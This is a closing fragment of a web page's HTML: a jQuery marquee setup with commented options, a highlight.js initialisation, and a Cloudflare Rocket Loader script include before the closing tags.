	jQuery(window).load(function() {
		jQuery('.message').marquee({
			//speed in milliseconds of the marquee
			duration: 12000,
			//gap in pixels between the tickers
			gap: 0,
			//time in milliseconds before the marquee will start animating
			delayBeforeStart: 500,
			//'left' or 'right'
			direction: 'left',
			//true or false - should the marquee be duplicated to show an effect of continues flow
			duplicated: true,
			pauseOnHover: true,
			startVisible: true
		});
		
		jQuery('.message-item').css('opacity', '1');
	});
	</script>
	<script type="af251fe0fdb97546bb0e0528-text/javascript">hljs.initHighlightingOnLoad();</script>



    	    			
<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="af251fe0fdb97546bb0e0528-|49" defer></script></body>
<!-- Body End -->

</html>
